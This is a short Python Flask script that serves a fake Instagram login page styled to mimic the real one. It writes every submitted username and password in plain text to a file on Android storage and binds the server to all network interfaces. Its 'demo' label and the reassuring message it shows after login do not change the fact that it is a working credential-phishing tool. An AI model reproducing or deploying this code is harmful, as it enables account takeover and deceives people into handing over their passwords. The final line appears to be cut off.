from flask import Flask, render_template_string, request

app = Flask(__name__)

# Simple HTML that looks like Instagram login
html = """
<!DOCTYPE html>
<html>
<head>
  <title>Instagram</title>
  <style>
    body { font-family: Arial; background:#fafafa; display:flex; justify-content:center; margin-top:50px;}
    .box { background:white; border:1px solid #dbdbdb; padding:20px; width:300px; text-align:center;}
    input { width:100%; padding:10px; margin:5px 0; border:1px solid #dbdbdb; border-radius:5px;}
    button { background:#0095f6; color:white; padding:10px; width:100%; border:none; border-radius:5px;}
  </style>
</head>
<body>
  <div class="box">
    <h2>Instagram</h2>
    <form method="post">
      <input name="username" placeholder="Phone number, username, or email" required><br>
      <input name="password" type="password" placeholder="Password" required><br>
      <button type="submit">Log In</button>
    </form>
  </div>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]

        # Save credentials to a file in internal storage
        with open("/storage/emulated/0/demo_logins.txt", "a") as f:
            f.write(f"{username} / {password}\n")

        return "<h3>This is just a demo! Your password is safe and saved locally.</h3>"

    return render_template_string(html)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000